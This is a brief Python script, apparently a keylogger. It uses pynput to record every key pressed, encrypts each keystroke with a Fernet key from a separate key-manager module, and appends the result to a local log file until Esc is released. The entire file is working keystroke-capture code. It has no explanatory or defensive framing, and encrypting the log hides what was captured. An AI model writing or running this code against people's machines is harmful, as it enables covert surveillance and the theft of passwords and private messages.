from pynput import keyboard
from cryptography.fernet import Fernet
import GenerateKey

key_manager = GenerateKey.KeyManager()
encryption_key = key_manager.GetKey()
cipher = Fernet(encryption_key)

log_file = "encrypted_log.txt"

def write_encrypted_log(data):
    encrypted_data = cipher.encrypt(data.encode())
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b"\n")

def on_press(key):
    try:
        write_encrypted_log(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_encrypted_log(" ")
        elif key == keyboard.Key.enter:
            write_encrypted_log("\n")
        else:
            write_encrypted_log(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
